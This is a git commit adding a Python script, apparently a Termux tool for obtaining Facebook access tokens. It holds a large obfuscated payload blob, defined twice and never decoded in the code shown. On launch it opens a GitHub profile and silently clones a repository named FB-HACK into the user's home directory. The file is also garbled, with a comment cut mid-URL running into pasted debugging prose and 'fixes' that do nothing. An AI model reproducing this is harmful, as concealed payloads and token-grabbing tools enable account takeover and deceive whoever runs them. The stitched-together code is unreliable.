662e8b34810f0246ff1a63f434ab399cc71e2c40
Potchollo M. Cabos <61383237+skyshadow04@users.noreply.github.com>
2024-08-02 03:50:10 +0400

    Add files via upload

---
+++ Run.py
@@ -0,0 +1,44 @@
+#pip install pycryptodome  , It works only v3.11 Above.
+from rich import print
+import random ,os , sys,base64,codecs,zlib;pyobfuscate=""
+
+os.system('clear')
+print('[bold green] Follow Me On GitHub To Use ')
+
+os.system('xdg-open https:///github.com/STARK-404/')
+
+obfuscate = {
+    '(https://pyobfuscate.com)*(RSA)': '''z|%jOx`;CeIr@a&*{j)Br(r_7<C1Qx{g3TL-+azwSzbCZCs~ThYf(QZ4zvR7uRVgE_n#&coU}J)BC{`%W?isnx;mDxvWMu1ZThS_unYHktXbt=!9V%lVrUNBjCQCjpS$GRIlKJQ=s#O))vBrQ_dAmC<1#0k;bZNtQm~q7xI6Kza?Gjd3cH%ff7EL%gTx|p6n7H*Qxbf)GY)zc$k%u4qqj(ICl##VE%f}b@NBHTd+`85`FjeFzsEu)_d<J?PRd6Ou5&aCTpz@64+t>F`*ul2ThrQHrSJCSq^gCsg~wGs?pqkcsQ1J$7*8HomI8G@SYL6tXN&Fy&jRw`)zF@c_^g8ID`r(#I;Ap0$QlS!e0y%KX-??BJLETT1$D29qnIg<#YXUZuyYO0UEBH73<m)*L4^vFmpkqPogV|?>UdZuB<r&S%yc{8f_frnF2RGi&o2BgOn%p5Q!^xJY{x195v@K7T?eXwNT$)&szC+H!2(jmuyjeRmi3DD(C;Pkpx4jo962Blwv7XGFCs<sWhOwmElXXQA@l9avn@1GmhpHaE$xUrp><P|=zzsP_pJwHc=an1Sw!P3I9{`uWQIb~oCJAl5e|kMLy=X)U(iY{GE!UW_c&Ao#(~+>ul?}>l6DkEH4s&gK5CV@*2RewymJ%R`;@GfV?SP0ky^fAOlZ|g&R9_V#a6D+c=*pjK;+t8Lj_I7RP8&pJ%M{NZl#MiZoBcVWU))qAMhQQ>t*0n7=IdfO|f-L`*eD#8UMDf_wtgl#i#Z?v5?=@mkaGEh1TJW@I-A79ne<3#pZ#5%Cjz&tzURM#O}2Pq~Ez)2%j+CTVYA~lJQOIl7TJIjpnJ79ry;d)M8)lZ8Qr21$Lj3aP(EV);1x_z#uS5-e5IbEo!8Stm!+{`f@`mmuz}q_m4`ZI3!WyZe`WyoySdyGQ3<yU10#+*{>7^E`vQylgZ+Fn{F)h8uRiUc(#CJ)O!#-w}AMkJz*Okj!Lqj<W}|nv}dgL8gFzF(ouumZkkkq0E}+13HJvigDD$!-c>YF+ST+T7(nWrBTj+v%64ds(F(cydK)Zflq2>pOCz{F&~{L3a!>>o{Q8^eyE%3Umdh2!uAc^;6aN7AKBh8%@&%oG`{qs@U4c~Cwm(@nsxx<ZLQ|rUs%m4*^(u`?zU`o&fJm^;B3>X4kHhz!)!9BkqU1Yb5vi|m4LQ~r9(_i(HrL9`4Q>61-aB}iK!t{<;NX9`H!LmD1=Q=(eHRV}<paj^5O~E9jua_-3awm!a>+`TD&C#JhIR6atlRO<tc0ZD1p9BI>^8NoMUq;O8jlu7M{<DIiT~kjy&xpW<${CC7!|3pdD-jT9^`<oHDJx}+@)U(OQuZE^+lPVM?uEyeDo2Q@S=|1oMPGP_6|?*1Ir9=f!?m{^p++RAZE{9Z5_v;&4`(4pl@-gpD>h<<zaNF7Dv&36Br?$xnyIbVb;KCZ;p{F1u&7l59F>xYEs+i${GTHDqm7&b3&6g06F``=2Nz;N*p7!pug|`^j96o{~#kA5{mFXPka_2u~~~MfTg=7t_EKP?%j&upkRZWqLEtGq3J#u@_k6iBphTSt{dCR<sd%HZM@F<g1Xp1RWgq11qnB-d2Afm!nZT!vr^lvEcGEJ-5dot=HJMOI}`Rjl@Db+6LAZ7rU-vxGznjpiSpWa5U_OW84ycu5SaG0Q;G@q+*z2r<My~Uv=64h^nj<4Z@$~?{747Rd~|{kSIR)6D8J1O?1=1>;6Y7qM$<^WZb$MYu<~5JS3uS*5wUh4zNmn(?2#*XNkn$W{|@LJW!JMhJ(V3&=^CHnta3vJx#U<ZX*57b4nCrK+l83ueyaUd|3?4aiiv;4Q}I+nN{xSxJz=u<)AwT)GBsTP`<Ata3qdo9!~P(c<ssb2+Tpav>5WMQyn0=3G210BOIHURaCW?4+w4pFyuR$*UJ6w%icghdI?g)u;et-8;i7!LPdh+5d-UI*p(kyCQW-po!vwfP%)qzN?!+zAZ=r&YDJjZ}m^_zeKpXV+Z-?PlO+H!DH<(gTb}}c5{$KdCG1$-?ivrKs>NXmIe}O@MD2p+n^vCde_>mY{`cCfbor}^s%b*vij?uHof#fi|e0(c>cSyu7KWk<tNl6UP1BmK;s%G8V4ohJ(HLm_m(Dqn7oVU4Bt(K(y4~q-{60SUOhl#{`JoUNxeu4DnAcYMtN}3%&fb3f&Q%2C^x7kN7)BZ&KA6A;6u2l@%;SW9~C?{cWXNE4ja(;CxjG0X_KntLFEE8Ku2f>E82hSJe53ZrysKc9&atcV>9099A(Z?<7Hlix|{F8uW-;KdOQM-E-D!'''
+}
+
+try:
+    pyobfuscate = obfuscate['(https://pyobfuscate.com)*(RSA)']
+except KeyError:
+    pyobfuscate = ""
+
+#Here's a critical look at the section of the script:
+
+#```python
+obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(RSA)'],['''z|%jOx`;CeIr@a&*{j)Br(r_7<C1Qx{g3TL-+azwSzbCZCs~ThYf(QZ4zvR7uRVgE_n#&coU}J)BC{`%W?isnx;mDxvWMu1ZThS_unYHktXbt=!9V%lVrUNBjCQCjpS$GRIlKJQ=s#O))vBrQ_dAmC<1#0k;bZNtQm~q7xI6Kza?Gjd3cH%ff7EL%gTx|p6n7H*Qxbf)GY)zc$k%u4qqj(ICl##VE%f}b@NBHTd+`85`FjeFzsEu)_d<J?PRd6Ou5&aCTpz@64+t>F`*ul2ThrQHrSJCSq^gCsg~wGs?pqkcsQ1J$7*8HomI8G@SYL6tXN&Fy&jRw`)zF@c_^g8ID`r(#I;Ap0$QlS!e0y%KX-??BJLETT1$D29qnIg<#YXUZuyYO0UEBH73<m)*L4^vFmpkqPogV|?>UdZuB<r&S%yc{8f_frnF2RGi&o2BgOn%p5Q!^xJY{x195v@K7T?eXwNT$)&szC+H!2(jmuyjeRmi3DD(C;Pkpx4jo962Blwv7XGFCs<sWhOwmElXXQA@l9avn@1GmhpHaE$xUrp><P|=zzsP_pJwHc=an1Sw!P3I9{`uWQIb~oCJAl5e|kMLy=X)U(iY{GE!UW_c&Ao#(~+>ul?}>l6DkEH4s&gK5CV@*2RewymJ%R`;@GfV?SP0ky^fAOlZ|g&R9_V#a6D+c=*pjK;+t8Lj_I7RP8&pJ%M{NZl#MiZoBcVWU))qAMhQQ>t*0n7=IdfO|f-L`*eD#8UMDf_wtgl#i#Z?v5?=@mkaGEh1TJW@I-A79ne<3#pZ#5%Cjz&tzURM#O}2Pq~Ez)2%j+CTVYA~lJQOIl7TJIjpnJ79ry;d)M8)lZ8Qr21$Lj3aP(EV);1x_z#uS5-e5IbEo!8Stm!+{`f@`mmuz}q_m4`ZI3!WyZe`WyoySdyGQ3<yU10#+*{>7^E`vQylgZ+Fn{F)h8uRiUc(#CJ)O!#-w}AMkJz*Okj!Lqj<W}|nv}dgL8gFzF(ouumZkkkq0E}+13HJvigDD$!-c>YF+ST+T7(nWrBTj+v%64ds(F(cydK)Zflq2>pOCz{F&~{L3a!>>o{Q8^eyE%3Umdh2!uAc^;6aN7AKBh8%@&%oG`{qs@U4c~Cwm(@nsxx<ZLQ|rUs%m4*^(u`?zU`o&fJm^;B3>X4kHhz!)!9BkqU1Yb5vi|m4LQ~r9(_i(HrL9`4Q>61-aB}iK!t{<;NX9`H!LmD1=Q=(eHRV}<paj^5O~E9jua_-3awm!a>+`TD&C#JhIR6atlRO<tc0ZD1p9BI>^8NoMUq;O8jlu7M{<DIiT~kjy&xpW<${CC7!|3pdD-jT9^`<oHDJx}+@)U(OQuZE^+lPVM?uEyeDo2Q@S=|1oMPGP_6|?*1Ir9=f!?m{^p++RAZE{9Z5_v;&4`(4pl@-gpD>h<<zaNF7Dv&36Br?$xnyIbVb;KCZ;p{F1u&7l59F>xYEs+i${GTHDqm7&b3&6g06F``=2Nz;N*p7!pug|`^j96o{~#kA5{mFXPka_2u~~~MfTg=7t_EKP?%j&upkRZWqLEtGq3J#u@_k6iBphTSt{dCR<sd%HZM@F<g1Xp1RWgq11qnB-d2Afm!nZT!vr^lvEcGEJ-5dot=HJMOI}`Rjl@Db+6LAZ7rU-vxGznjpiSpWa5U_OW84ycu5SaG0Q;G@q+*z2r<My~Uv=64h^nj<4Z@$~?{747Rd~|{kSIR)6D8J1O?1=1>;6Y7qM$<^WZb$MYu<~5JS3uS*5wUh4zNmn(?2#*XNkn$W{|@LJW!JMhJ(V3&=^CHnta3vJx#U<ZX*57b4nCrK+l83ueyaUd|3?4aiiv;4Q}I+nN{xSxJz=u<)AwT)GBsTP`<Ata3qdo9!~P(c<ssb2+Tpav>5WMQyn0=3G210BOIHURaCW?4+w4pFyuR$*UJ6w%icghdI?g)u;et-8;i7!LPdh+5d-UI*p(kyCQW-po!vwfP%)qzN?!+zAZ=r&YDJjZ}m^_zeKpXV+Z-?PlO+H!DH<(gTb}}c5{$KdCG1$-?ivrKs>NXmIe}O@MD2p+n^vCde_>mY{`cCfbor}^s%b*vij?uHof#fi|e0(c>cSyu7KWk<tNl6UP1BmK;s%G8V4ohJ(HLm_m(Dqn7oVU4Bt(K(y4~q-{60SUOhl#{`JoUNxeu4DnAcYMtN}3%&fb3f&Q%2C^x7kN7)BZ&KA6A;6u2l@%;SW9~C?{cWXNE4ja(;CxjG0X_KntLFEE8Ku2f>E82hSJe53ZrysKc9&atcV>9099A(Z?<7Hlix|{F8uW-;KdOQM-E-D!``<^hex4^aH1ij(<Kx+47dE9Fh#x`~aUXRg_GY#V4d+0pe3Nr04t@)4h{FAg3TyyaW6>IdfOoj9r#q@H=i(>|HO_nbkOx!Puz1tAoSi`mB?|KY#j8FqrratG*(`N!1Q54Is3g`TDMG&713u?Hw8s0VWZ_ZhPKW;9O_Dozy9yi+<BPZ3TrjA%MjI1Z=DpSJrOwBwi`GQwCb*snp%{BD;dUNk_}TqmIP@bG$C1D?<-qjxO<l8B''']))
+try:
+    pyobfuscate = obfuscate['(https://pyobfuscate.com)*(RSA)']
+except KeyError:
+    pyobfuscate = ""
+
+try:
+    os.system('cd $HOME && mkdir FACEBOOK_TOKEN && cd FACEBOOK_TOKEN && git clone https://github.com/STARK-404/FB-HACK.git')
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+
+print("[bold red] Copy !! [green] Facebook Token Access (Use For Termux)")
+print('[white]--------------------------------------------')
+#os.system('cd $HOME && mkdir FACEBOOK_TOKEN && cd FACEBOOK_TOKEN && git clone https://github.comThe error in the script occurs due to the attempt to concatenate `None` with a string. Specifically, the line `pyobfuscate += obfuscate['(https://pyobfuscate.com)*(RSA)']` might be causing this issue if `obfuscate['(https://pyobfuscate.com)*(RSA)']` is returning `None`.
+
+#Here are the corrected lines from the script:
+
+#```python
+try:
+    pyobfuscate += obfuscate['(https://pyobfuscate.com)*(RSA)']
+except TypeError:
+    pass
